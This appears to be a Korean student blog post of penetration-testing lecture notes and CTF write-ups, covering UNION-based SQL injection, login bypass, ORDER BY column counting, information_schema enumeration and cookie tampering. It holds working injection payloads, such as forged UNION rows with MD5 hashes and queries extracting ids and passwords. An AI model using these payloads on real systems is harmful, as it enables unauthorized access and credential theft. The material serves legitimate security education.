--- meta
title: Penetration Testing | Week 6
date: 2025/05/13
excerpt: UNION SQL Injection과 데이터 추출
categories: 모의 해킹
---

### 강의 노트

#### UNION 연산자

**`UNION`** 연산자는 SQL에서 두 개 이상의 `SELECT` 쿼리 결과를 하나의 결과 집합으로 결합할 때 사용하는 연산자이다. 각 `SELECT` 문이 반환하는 컬럼의 개수가 동일해야 하며, 반환되는 컬럼의 이름은 첫 번째 쿼리문을 기준으로 결정된다.

`UNION`의 사용법을 실행 예시와 함께 알아보자. 사용 예시는 다음의 `stock_list`와 `company_ranking` 테이블을 기준으로 한다.

<table>
  <caption style="margin-bottom: 24px; text-align: left; font-weight: bold;">stock_list</caption>
  <thead>
    <tr>
      <th>company_id</th>
      <th>stock_symbol</th>
      <th>company_name</th>
      <th>market</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>AAPL</td>
      <td>Apple</td>
      <td>NASDAQ</td>
    </tr>
    <tr>
      <td>2</td>
      <td>TSLA</td>
      <td>Tesla</td>
      <td>NASDAQ</td>
    </tr>
    <tr>
      <td>3</td>
      <td>MSFT</td>
      <td>Microsoft</td>
      <td>NASDAQ</td>
    </tr>
    <tr>
      <td>4</td>
      <td>JPM</td>
      <td>JPMorgan Chase</td>
      <td>NYSE</td>
    </tr>
    <tr>
      <td>5</td>
      <td>NVDA</td>
      <td>NVIDIA</td>
      <td>NASDAQ</td>
    </tr>
  </tbody>
</table>

<table>
  <caption style="margin-bottom: 24px; text-align: left; font-weight: bold;">company_ranking</caption>
  <thead>
    <tr>
      <th>rank</th>
      <th>ticker</th>
      <th>company</th>
      <th>market_cap</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>AAPL</td>
      <td>Apple</td>
      <td>$2.9T</td>
    </tr>
    <tr>
      <td>2</td>
      <td>MSFT</td>
      <td>Microsoft</td>
      <td>$2.8T</td>
    </tr>
    <tr>
      <td>3</td>
      <td>GOOGL</td>
      <td>Alphabet(Google)</td>
      <td>$1.9T</td>
    </tr>
    <tr>
      <td>4</td>
      <td>AMZN</td>
      <td>Amazon</td>
      <td>$1.7T</td>
    </tr>
    <tr>
      <td>5</td>
      <td>NVDA</td>
      <td>NVIDIA</td>
      <td>$1.5T</td>
    </tr>
  </tbody>
</table>

`UNION`의 문법은 다음과 같이 정리할 수 있다.

```sql
/* Syntax */
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;

/* Example */
SELECT stock_symbol, company_name FROM stock_list
UNION
SELECT ticker, company FROM company_ranking;
```

위의 예시 쿼리를 실행하면 다음과 같은 결과가 반환된다.

| stock_symbol | company_name     |
|--------------|------------------|
| AAPL         | Apple            |
| TSLA         | Tesla            |
| MSFT         | Microsoft        |
| JPM          | JPMorgan Chase   |
| NVDA         | NVIDIA           |
| GOOGL        | Alphabet(Google) |
| AMZN         | Amazon           |

실행 결과에서 확인할 수 있듯이, `UNION` 연산자는 기본적으로 중복된 행을 제거하여 결과를 반환한다. 중복 행을 포함하여 모든 결과를 반환하고자 할 경우에는 <strong>`UNION ALL`</strong>을 사용할 수 있다.

`UNION`을 활용하는 목적은 다양하지만, 대표적인 용도 중 하나는 기존 테이블에 임시로 사용되는 더미 데이터를 결합하여 처리하는 것이다. 이는 테스트 단계에서 일부 가상의 행을 추가하여 동작을 검증하거나, '기타' 혹은 '미분류' 등의 가상 항목을 포함해야 하는 경우에 유용하게 사용된다. 사용 예시는 다음과 같다.

```sql
SELECT * FROM stock_list
UNION
SELECT 0, 'OTHER', 'Unknown', 'N/A';
```

두 번째 `SELECT` 문에서 주목할 점은, 일반적으로 사용되는 `SELECT column_name FROM table_name`의 형태가 아니라는 것이다. 이는 특정 테이블로부터 결과를 반환하는 것이 아니라, 사용자가 직접 지정한 상수 값으로 구성된 행을 반환하도록 지시하는 표현이다. 이와 같이 SQL에서는 상수로 정의된 값을 직접 선택하여 결과로 반환할 수 있다. 따라서 위의 예시 쿼리를 실행하면 다음과 같은 결과가 반환된다.

| company_id | stock_symbol | company_name     | market  |
|------------|--------------|------------------|---------|
| 1          | AAPL         | Apple            | NASDAQ  |
| 2          | TSLA         | Tesla            | NASDAQ  |
| 3          | MSFT         | Microsoft        | NASDAQ  |
| 4          | JPM          | JPMorgan Chase   | NYSE    |
| 5          | NVDA         | NVIDIA           | NASDAQ  |
| **0**      | **OTHER**    | **Unknown**      | **N/A** |

이와 같이, `UNION` 연산을 통해 기존 테이블에 임의의 가상 데이터를 추가한 결과 집합을 구성할 수 있다.

---

#### UNION SQL Injection

##### 동작 원리

`UNION`의 활용 예시를 보면 해당 연산자가 SQL Injection 공격에 유용하게 사용될 수 있다는 점을 추론할 수 있다. 이를테면 다음과 같은 로그인 처리 코드를 생각해 보자.

<style>
  .hljs-subst {
    color: #e36209;
  }
</style>

```php
$username = $_POST['UserId'];
$password = $_POST['Password']

$sql = "SELECT * FROM user WHERE username = '$username'";
$res = mysqli_query($db_conn, $sql);
$user = mysqli_fetch_array($res);

if ($user && $user['password'] == $password) {
  // Login Successful
} else {
  // Login Failed
}
```

5주차에 학습한 SQL Injection은 `SELECT * FROM user WHERE username = '$username' AND password = '$password'`와 같은 쿼리에서 비밀번호 확인 조건을 우회하기 위한 공격 기법이었다. 그러나 위 코드와 같이 비밀번호의 일치 여부를 별도로 확인하는 식별·인증 분리 방식에서는 이와 같은 형태의 SQL Injection이 유효하지 않다. 비밀번호 검증이 SQL 쿼리 내부에서 수행되는 것이 아니기 때문이다. 이러한 상황에서 `UNION` 연산자를 이용하면 로그인 과정을 우회할 수 있다.

예를 들어, `user` 테이블이 다음과 같다고 가정해 보자.

| username | password |
|----------|----------|
| Alice    | 1234     |
| Bob      | abcd     |

로그인 양식의 `username` 입력 란에 `' UNION SELECT 'Alice', '0000`을 입력한다고 가정하면, `$sql` 변수에 저장되는 SQL 쿼리는 다음과 같다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> user <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">''</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'0000'</span>
</code></pre>

첫 번째 `SELECT` 문은 `username`이 빈 문자열인 행을 반환하므로, 결과로 반환되는 행이 존재하지 않는다. 두 번째 SELECT 문은 지정한 상수 값으로 구성된 행을 반환한다. 따라서 `$res`에 저장되는 결과는 다음과 같다.

| username | password |
|----------|----------|
| Alice    | 0000     |

`UNION`을 이용하여 `username`이 `Alice`이고 `password`가 `0000`인 행을 `$user` 변수에 저장할 수 있었다. `password`로 `0000`을 입력하였다면 로그인 절차가 성공적으로 수행되었을 것이다.

이와 같이, `UNION` 연산자는 임의의 더미 데이터를 쿼리 결과로 반환시키는 방식으로 SQL Injection 공격에 활용될 수 있다.

<br>

##### 컬럼 수 파악: ORDER BY 기법

위의 UNION SQL Injection 예시에서 구체적으로 설명하지 않았지만, 반드시 짚고 넘어가야 하는 사항이 있다. `UNION` 연산자를 사용하려면 각 `SELECT` 문이 반환하는 컬럼의 개수가 동일해야 한다는 요구 사항이 존재한다. 예시에서 가정한 `user` 테이블은 컬럼이 2개였으므로, `SELECT 'Alice', '0000'`과 같은 쿼리가 UNION으로 결합되었을 때 정상적으로 작동한 것이다. 그러나 실제로 `user` 테이블이 아래와 같은 형태였다고 가정해 보자.


| id | username | password |
|----|----------|----------|
| 1  | Alice    | 1234     |
| 2  | Bob      | abcd     |

위 예시와 동일한 SQL 쿼리가 실행될 경우, 첫 번째 `SELECT` 문이 반환하는 컬럼의 개수(3)와 두 번째 `SELECT` 문이 반환하는 컬럼의 개수(2)가 일치하지 않아 오류가 발생할 것이다. 따라서 `user` 테이블의 컬럼 개수를 파악하는 절차가 반드시 선행되어야 한다. 하지만 데이터베이스에 직접 접근하여 이를 확인할 수는 없다. 그렇다면 어떻게 컬럼 개수를 확인할 수 있을까?

이때 사용할 수 있는 기법이 바로 <strong>`ORDER BY`</strong> 명령어를 활용한 방법이다.  
`ORDER BY`는 `SELECT` 문의 결과 집합을 정렬할 때 사용하는 명령어이다. 다음과 같은 방식으로 사용할 수 있다.

```sql
/* Syntax */
SELECT column_name(s) FROM table_name ORDER BY column_name;

/* Example */
SELECT stock_symbol, company_name FROM stock_list
ORDER BY company_name; -- 오름차순 정렬(Default)

SELECT stock_symbol, company_name FROM stock_list
ORDER BY company_name DESC; -- 내림차순 정렬
```

`SELECT stock_symbol, company_name FROM stock_list ORDER BY company_name;`의 실행 결과는 다음과 같다.

| stock_symbol | company_name   |
|--------------|----------------|
| AAPL         | Apple          |
| JPM          | JPMorgan Chase |
| MSFT         | Microsoft      |
| NVDA         | NVIDIA         |
| TSLA         | Tesla          |

이러한 `ORDER BY`를 사용해 어떻게 테이블의 컬럼 개수를 파악할 수 있을까? 핵심은 바로 `ORDER BY` 절에서 컬럼의 이름 대신 인덱스를 사용할 수 있다는 사실이다. 다시 말해, `ORDER BY company_name` 대신에 `ORDER BY 3`과 같은 방식으로 사용할 수 있다. `company_name`은 `stock_list` 테이블의 3번째 컬럼이므로, `ORDER BY 3`은 3번째 컬럼인 `company_name`을 기준으로 정렬하라는 의미가 된다.

그렇다면 4개의 컬럼을 가진 `stock_list` 테이블에서 `SELECT * FROM stock_list ORDER BY 5;`와 같은 쿼리를 사용하면 어떻게 될까?

![ORDER BY](/data/Penetration%20Testing%20|%20Week%206/1.png)

Unknown Column, 즉 해당 컬럼을 찾을 수 없다는 오류가 발생한다.

정리하면 컬럼의 개수가 n개인 테이블에서 `ORDER BY n`까지는 오류가 발생하지 않으며, `ORDER BY n+1`부터는 오류가 발생한다. 이러한 특성을 활용해 특정 테이블의 컬럼 개수를 파악할 수 있다.

<br>

##### 데이터 추출

앞서 살펴봤듯이 `UNION` 연산자를 활용하면 로그인을 우회하는 SQL Injection 공격이 가능하다. 그러나 실제로 UNION SQL Injection이 보다 광범위하게 활용되는 사례는 공격자가 데이터베이스로부터 특정 데이터를 추출하고자 할 때이다. 이러한 데이터 추출 절차는 통상적으로 다음과 같은 단계로 구성된다.

**1. SQL Injection 지점 식별**   
**2. 컬럼 수 파악**  
**3. 출력 컬럼 위치 식별**  
**4. 데이터베이스 이름 추출**  
**5. 테이블 이름 추출**  
**6. 컬럼 이름 추출**  
**7. 데이터 추출**

각 단계를 자세히 살펴 보자. 구체적인 설명을 위해 아래와 같은 간이 게임 검색 사이트를 예시로 사용한다.

![게임 검색 사이트](/data/Penetration%20Testing%20|%20Week%206/2.png)

<br>

**1. SQL Injection 지점 식별**

검색 예시에 쓰인 대로 우선 `Overwatch`를 검색해 보자.

![SQL Injection 지점 식별](/data/Penetration%20Testing%20|%20Week%206/3.png)

`Overwatch` 게임의 정보를 포함하고 있는 테이블이 반환되었다. 이 시점에서, 게임 정보를 저장하고 있는 테이블이 존재하며 `SELECT` 문과 `WHERE` 절을 통해 해당 정보가 조회된다는 것을 유추할 수 있다. 한 가지 주목할 만한 부분은 다음과 같이 `Over`만 검색했을 때이다.

![SQL Injection 지점 식별](/data/Penetration%20Testing%20|%20Week%206/4.png)

마찬가지로 `Overwatch`의 정보가 출력되었다. 이는 SQL 쿼리에서 `LIKE` 연산자를 사용하고 있음을 암시한다.

> **LIKE**
>
> <strong>`LIKE`</strong>는 WHERE 절에서 문자열 비교 시 특정 패턴을 식별하기 위해 사용하는 연산자이다.  
> 주로 와일드카드 문자인 `%`와 함께 사용되며, 기본적인 사용 방식은 다음과 같다.
>
> <pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-comment">/* Syntax */</span>
> <span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">LIKE</span> pattern;
>
> <span class="hljs-comment">/* Example */</span>
> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'Kim%'</span>; <span class="hljs-comment">-- Kim으로 시작하는 문자열 검색</span>
> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> email <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%.com'</span>; <span class="hljs-comment">-- .com으로 끝나는 문자열 검색</span>
> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%phone%'</span>; <span class="hljs-comment">-- phone이 포함된 문자열 검색</span>
> </code></pre>

![SQL Injection 지점 식별](/data/Penetration%20Testing%20|%20Week%206/5.png)

서버 측 SQL 쿼리를 직접 확인해 보면 예상대로 `LIKE` 절이 사용되고 있음을 알 수 있다. 이처럼 사용되는 SQL 쿼리의 구조를 어느 정도 확인했다면, 해당 입력 란에 대한 SQL Injection이 가능한지 확인해 볼 필요가 있다. 검색어로 `Over%' and '1%' = '1`을 입력해 보자.

![SQL Injection 지점 식별](/data/Penetration%20Testing%20|%20Week%206/6.png)

SQL 쿼리가 논리적으로 동일한 의미인 `SELECT * FROM game WHERE name LIKE '%Over%' and '1%' = '1%'`의 형태로 재구성되었으며, 여전히 `Overwatch`의 정보가 정상적으로 출력된다. 이를 통해 사용자 입력이 SQL 문법의 일부로 처리되며 SQL Injection이 가능함을 알 수 있다.

첫 번째 단계에서는 이와 같이 `AND` **연산자와 항등 관계를 활용해 SQL Injection이 가능한 입력 지점을 식별한다.**

<br>

**2. 컬럼 수 파악**

이번에는 게임 정보가 저장된 테이블(`game`)의 컬럼 수를 파악해 보자. 앞서 살펴봤듯이 `ORDER BY` 명령어를 사용하면 컬럼 의 수를 추론할 수 있다. 검색 란에 `Over%' order by 1#`부터 차례대로 인덱스를 늘려 가며 입력해 보자.

![컬럼 수 파악](/data/Penetration%20Testing%20|%20Week%206/7.png)

`Over%' order by 4#`까지는 정상적으로 결과가 반환된다.

![컬럼 수 파악](/data/Penetration%20Testing%20|%20Week%206/8.png)

`Over%' order by 5#`를 입력하면 오류가 발생한다. 즉, `game` 테이블의 컬럼 수가 총 4개임을 확인할 수 있다.

두 번째 단계에서는 이와 같이 `ORDER BY` **명령어를 활용해 대상 테이블의 컬럼 수를 파악한다.**

<br>

**3. 출력 컬럼 위치 식별**

`game` 테이블의 컬럼 수는 4개로 확인되었으나, 실제로 사용자에게 출력되는 컬럼의 수는 3개에 불과하다. 그렇다면 현재 출력되고 있는 3개의 컬럼은 어떤 컬럼일까? `UNION` 연산자를 활용하면 이를 파악할 수 있다. 다음과 같이 `Over%' union select 1, 2, 3, 4#`를 입력해 보자.

![출력 컬럼 위치 식별](/data/Penetration%20Testing%20|%20Week%206/9.png)

반환된 결과를 보면 `UNION` 절을 통해 추가된 레코드에서 `2`, `3`, `4`의 값만 출력되는 것을 알 수 있다. 이는 첫 번째 컬럼의 값은 화면상에 노출되고 있지 않다는 사실을 의미한다.

세 번째 단계에서는 이와 같이 `UNION SELECT` **문을 활용해 사용자 화면에 출력되는 컬럼의 위치를 식별한다.**

<br>

**4. 데이터베이스 이름 추출**

`UNION` 연산자를 활용하면 임의의 `SELECT` 문을 기존 쿼리에 결합하여 원하는 데이터를 조회할 수 있게 된다. 예를 들어 다음과 같이 `Over%' union select 1, 2, 3, pass from member#`를 입력해 보자.

![데이터베이스 이름 식별](/data/Penetration%20Testing%20|%20Week%206/10.png)

`select 1, 2, 3, pass from member`는 반환 결과의 4번째 컬럼 위치에 `member` 테이블의 `pass` 컬럼의 값을, 나머지 컬럼에는 `1`, `2`, `3`의 상수 값을 삽입하라는 의미이다. 따라서 위와 같이 `pass` 컬럼의 모든 데이터가 출력되는 것을 알 수 있다.

다만 일반적인 상황에서 사용자는 `member` 테이블이나 `pass`라는 컬럼명이 실제로 존재하는지를 알지 못한다. 따라서 본격적인 데이터 추출에 앞서, 데이터베이스 내에 어떤 테이블과 컬럼이 존재하는지를 파악하는 과정이 필요하다.

이를 위해선 우선 현재 사용 중인 데이터베이스의 이름을 확인해야 한다. SQL에서는 다음과 같은 쿼리를 통해 현재 데이터베이스명을 조회할 수 있다.

```sql
SELECT DATABASE();
```

그렇다면, 위와 유사한 방식으로 `Over%' union select 1, 2, 3, database()#`를 입력해 보자.

![데이터베이스 이름 추출](/data/Penetration%20Testing%20|%20Week%206/11.png)

`segfault_sql`이라는 데이터베이스 이름이 출력되는 것을 확인할 수 있다.

네 번째 단계에서는 이와 같이 `DATABASE()` **함수를 활용해 데이터베이스의 이름을 추출한다.**

<br>

**5. 테이블 이름 추출**

사용 중인 데이터베이스를 확인한 이후에는 해당 데이터베이스에 어떤 테이블들이 존재하는지를 확인해야 한다.

모든 주요 데이터베이스 시스템에는 데이터베이스명, 테이블명, 컬럼명 등의 메타데이터를 저장하는 특수한 데이터베이스인 `INFORMATION_SCHEMA`가 존재한다. 이 데이터베이스의 내부에는 다양한 메타데이터 테이블이 존재하며, 그 중 테이블에 대한 정보를 저장하고 있는 테이블은 `TABLES`이다. 해당 테이블은 `INFORMATION_SCHEMA.TABLES`와 같은 형식으로 접근할 수 있다.

현재 사용 중인 `segfault_sql` 데이터베이스에 존재하는 테이블명을 조회하는 쿼리는 다음과 같다.

```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_SCHEMA = 'segfault_sql';
```

그렇다면, 앞선 방식과 유사하게 `Over%' union select 1, 2, 3, table_name from information_schema.tables where table_schema = 'segfault_sql'#`을 입력해 보자.

![테이블 이름 추출](/data/Penetration%20Testing%20|%20Week%206/12.png)

`segfault_sql` 데이터베이스에 존재하는 테이블들을 확인할 수 있다.

다섯 번째 단계에서는 이와 같이 `INFORMATION_SCHEMA.TABLES` **테이블을 활용해 현재 사용 중인 데이터베이스에 존재하는 테이블의 이름을 추출한다.**

<br>

**6. 컬럼 이름 추출**

위와 같은 과정을 거쳐 앞서 언급한 `member` 테이블이 실제로 존재함을 확인하였다. 이제 해당 테이블에 정의되어 있는 컬럼들의 이름을 추출하는 작업을 수행해 보자.

`member` 테이블의 컬럼명을 조회하는 쿼리는 다음과 같다.

```sql
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = 'member';
```

마찬가지 방식으로 `Over%' union select 1, 2, 3, column_name from information_schema.columns where table_name = 'member'#`를 입력해 보자.

![컬럼 이름 추출](/data/Penetration%20Testing%20|%20Week%206/13.png)

`member` 테이블에 존재하는 컬럼들을 확인할 수 있다.

여섯 번째 단계에서는 이와 같이 `INFORMATION_SCHEMA.COLUMNS` **테이블을 활용해 지정된 테이블에 존재하는 컬럼의 이름을 추출한다.**

<br>

**7. 데이터 추출**

일련의 절차를 모두 수행한 뒤에는 `Over%' union select 1, 2, id, pass from member#`와 같은 페이로드를 통해 최종적으로 원하는 데이터를 추출할 수 있게 된다.

![컬럼 이름 추출](/data/Penetration%20Testing%20|%20Week%206/14.png)

<br>
<br>
<br>

### 과제

#### Authentication Bypass & SQL Injection CTF

![Authentication Bypass & SQL Injection CTF](/data/Penetration%20Testing%20|%20Week%206/15.png)

CTF를 해결하며 지금까지 학습한 내용을 바탕으로 인증 우회 및 데이터 추출을 수행해 보자.

<br>

##### Login Bypass 3

<img src="/data/Penetration%20Testing%20%7C%20Week%206/16.png" alt="Login Bypass 3" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하여 로그인을 시도해 보았다.

![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/17.png)
![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/18.png)

앞선 Login Bypass 문제와 동일하게, 로그인에 성공하면 `index.php`로 리다이렉트되고 실패하면 `200 OK`가 출력되는 것을 확인할 수 있었다. 이에 따라 즉시 SQL Injection을 시도해 보았다.

| `UserId`               | `Password` | 결과      |
|------------------------|------------|----------|
| `doldol' and '1' = '1` | `dol1234`  | 로그인 성공 |
| `doldol' or '1' = '1`  | `any`      | 로그인 실패 |
| `doldol' or '1' = '2`  | `dol1234`  | 로그인 성공 |
| `doldol'#`             | `dol1234`  | 로그인 성공 |
| `doldol'#`             | `any`      | 로그인 실패 |

`OR` 연산자와 주석 처리를 이용한 방법으로는 로그인이 되지 않았다. 특정 문자열에 대한 필터링 또한 적용된 것으로 보이지 않았으므로, 로그인 처리가 식별·인증 분리 방식으로 이루어졌을 가능성이 높다고 판단되었다.

따라서 UNION SQL Injection을 시도해 보기로 결정하였고, 사용되는 테이블의 컬럼 수를 파악하기 위해 `ORDER BY` 기법을 적용해 보았다.

![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/19.png)
![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/20.png)

`order by 2`까지는 로그인에 성공하고, `order by 3`에서 실패하는 것을 확인하였다. 이를 통해 컬럼 수는 총 2개이고, 각각 아이디와 비밀번호 컬럼일 것으로 추정하였다. 이후 `UNION SELECT` 문을 사용해 가상의 레코드를 추가해 로그인을 시도해 보았다. 각 컬럼 중 어느 컬럼이 아이디인지는 알 수 없었으므로, 두 컬럼에 동일한 문자열을 입력하였다.

![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/21.png)

`UNION`을 이용한 공격은 로그인에 성공하였다. 이제 아이디 값만 `normaltic3`로 변경하면 문제 해결이 완료된다. 우선 첫 번째 컬럼이 아이디라고 가정하고 로그인을 시도하였다.

![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/22.png)
![Login Bypass 3](/data/Penetration%20Testing%20|%20Week%206/23.png)

로그인에 성공하고 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">UniUniONONON</span>}</span></p>

<br>

##### Login Bypass 4

<img src="/data/Penetration%20Testing%20%7C%20Week%206/24.png" alt="Login Bypass 4" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하여 로그인을 시도해 보았다.

| `UserId`                       | `Password` | 결과      |
|--------------------------------|------------|----------|
| `doldol' and '1' = '1`         | `dol1234`  | 로그인 성공 |
| `doldol' or '1' = '1`          | `any`      | 로그인 실패 |
| `doldol' or '1' = '2`          | `dol1234`  | 로그인 성공 |
| `doldol'#`                     | `dol1234`  | 로그인 성공 |
| `doldol'#`                     | `any`      | 로그인 실패 |
| `doldol' order by 2#`          | `dol1234`  | 로그인 성공 |
| `doldol' order by 3#`          | `dol1234`  | 로그인 실패 |
| `' union select 'any', 'any'#` | `any`      | 로그인 실패 |

기본적인 SQL Injection은 물론 `UNION` 연산자를 활용한 방식 또한 로그인에 실패하였다. `UNION SELECT` 문을 사용하면 SQL 쿼리가 반환하는 레코드가 `'any', 'any'`가 되므로, 비밀번호로 `any`를 입력하면 이론적으로는 로그인에 성공해야 한다. 3주차에 배웠던 로그인 처리 로직 중 `UNION`을 활용한 공격이 통하지 않는 로직이 무엇이 있을지에 대해 검토해 보았다.

잠시 고민한 결과, 식별·인증 분리 방식에 해시 함수가 결합된 구조에서는 `UNION` 기반의 공격이 성공할 수 없다는 사실을 파악하였다. 아래의 코드를 보자.

```php
$username = $_POST['username'];
$password = hash('sha256', $_POST['password']);

$sql = "SELECT * FROM users WHERE username = '$username'";
$res = mysqli_query($db_conn, $sql);
$user = mysqli_fetch_array($res);

if ($user && $user['password'] == $password) {
  // Login Successful
} else {
  // Login Failed
}
```

로그인 성공 여부를 판단하는 조건문에서, `$user` 변수에 저장된 레코드의 `'password'` 컬럼은 사용자가 직접 입력한 비밀번호가 아닌 `sha256` 방식으로 해시 처리된 비밀번호와 비교된다. 따라서 `UNION SELECT` 문을 통해 가상의 레코드를 삽입하더라도 해당 레코드의 비밀번호가 동일한 해시 함수로 변환된 결과여야만 로그인을 성공적으로 우회할 수 있는 것이다.

로그인 절차가 이러하다는 전제를 바탕으로, 다시 `UNION`을 이용한 공격을 시도하기로 결정하였다. 다만 시스템 내부에서 사용된 해시 알고리즘이 정확히 무엇인지는 확인할 수 없었고, 구체적으로 어떤 알고리즘들이 적용 가능한지에 대한 정보 또한 부족하였다. 이에 PHP 공식 문서를 참조하여 `hash()` 함수에 대해 조사해 보았다.

![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/25.png)

`hash_algos()` 함수를 이용하면 PHP에서 지원하는 해시 알고리즘의 목록을 확인할 수 있다고 한다. 바로 `hash_algos()` 함수에 대해서도 조사해 보았다.

![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/26.png)

조사 결과 공격에 활용 가능한 해시 알고리즘 후보군을 확보하였고, 이후 `UNION SELECT` 문을 통해 해시 처리된 비밀번호 값을 삽입하는 방식의 공격을 구상하였다. 해시 처리를 사전에 외부에서 선행한 후 직접 삽입하는 방식도 고려할 수 있었으나, 반복적인 시도를 자동화하기 위해 우선 SQL에서도 해시 함수가 지원되는지 먼저 확인하였다.

![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/27.png)

MySQL 공식 문서를 보니 `MD5`, `SHA-1`, `SHA-2`와 같은 주요 해시 알고리즘들은 내장 함수로 지원되는 듯했다. 이에 따라 우선적으로 해당 함수들을 적용해 보기로 결정하였다.

아이디 입력 란에 `' union select 'any', MD5('any')#`, 비밀번호 입력 란에 `any`를 입력하고 로그인을 시도해 보았다.

![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/28.png)

그 결과, 첫 번째 시도에서 로그인이 성공적으로 수행되었다. 이제 아이디만 `normaltic4`로 변경하면 문제 해결이 완료된다.

![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/29.png)
![Login Bypass 4](/data/Penetration%20Testing%20|%20Week%206/30.png)

로그인에 성공하고 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">H4shBrown</span>}</span></p>

<br>

##### Login Bypass 5

<img src="/data/Penetration%20Testing%20%7C%20Week%206/31.png" alt="Login Bypass 5" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하여 로그인을 시도해 보았다.

![Login Bypass 5](/data/Penetration%20Testing%20|%20Week%206/32.png)

앞선 Login Bypass 문제들과는 다르게 서버 응답의 `Set-Cookie` 헤더에 `loginUser=doldol` 값이 설정되어 있음을 확인하였다.

![Login Bypass 5](/data/Penetration%20Testing%20|%20Week%206/33.png)

이후 `index.php`에 접근할 때, 요청 헤더에 `loginUser=doldol` 쿠키가 자동으로 포함되어 전송된다. 따라서 해당 쿠키 값인 `loginUser`를 `normaltic5`로 변경하면 로그인에 성공할 것으로 예측하였다.

![Login Bypass 5](/data/Penetration%20Testing%20|%20Week%206/34.png)

로그인에 성공하고 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">C00kiesYummy</span>}</span></p>

<br>

##### SQL Injection 1

<img src="/data/Penetration%20Testing%20%7C%20Week%206/35.png" alt="SQL Injection 1" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 다음과 같은 웹 페이지로 이동한다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/36.png)

숨겨진 데이터를 추출하는 것이 목적이므로, 데이터 추출을 위한 UNION SQL Injection의 7단계 절차를 순차적으로 수행해 보았다.

<br>

**1. SQL Injection 지점 식별**

검색 창에 `User ID`를 입력하면 해당하는 `ID`에 관한 정보가 출력되는 것으로 추정된다. 우선 검색을 수행해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/37.png)

입력한 검색어가 GET 방식으로 서버에 전달되어 SQL 쿼리에 삽입되는 구조로 예상되었다. SQL Injection이 가능한지 확인하기 위해 검색어로 `Adminer' and '1' = '1`를 입력해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/38.png)

`Adminer`에 대한 정보가 출력되지 않았다. 그렇다면 SQL 쿼리가 `SELECT * FROM table_name WHERE ID = '____'`와 같은 일반적인 형태는 아니라는 의미이다.

가장 먼저 떠오른 가능성은 쿼리 내에 `LIKE` 절이 존재하는 경우였다. 이를테면 `SELECT * FROM table_name WHERE ID LIKE '%____%'`와 같은 형태일 수 있다. 그렇다면 `Adminer`가 아닌 `Admin`과 같은 검색어만 입력해도 `Adminer`에 대한 정보가 출력될 것이다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/39.png)

예상대로 `Admin`만 입력해도 성공적으로 검색이 수행되었다. 이에 따라 페이로드를 `Admin%' and '1%' = '1`로 변경하여 입력해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/40.png)

`Adminer`의 정보가 출력되었다. 따라서 검색 란에서 SQL Injection이 가능하다는 사실을 파악하였다.

<br>

**2. 컬럼 수 파악**

다음으로 현재 SQL 쿼리에 사용되는 테이블의 컬럼 수를 파악하기 위해 `ORDER BY` 기법을 적용하였다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/41.png)
![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/42.png)

`Admin%' order by 4#`를 입력할 때까지는 정상적으로 검색되고, `Admin%' order by 5#`를 입력하면 검색 결과가 반환되지 않는 것을 확인하였다. 즉, 해당 테이블의 컬럼 수는 4개이다.

<br>

**3. 출력 컬럼 위치 식별**

`Admin%' union select 1, 2, 3, 4#`를 입력하여 출력 컬럼의 위치를 확인해 보았다.

![SQL Injection 1](/data/Penetration%20Testing%20|%20Week%206/43.png)

앞에서부터 순서대로 1, 2, 3, 4번째 컬럼이 출력되는 것을 확인하였다.

<br>

**4. 데이터베이스 이름 추출**

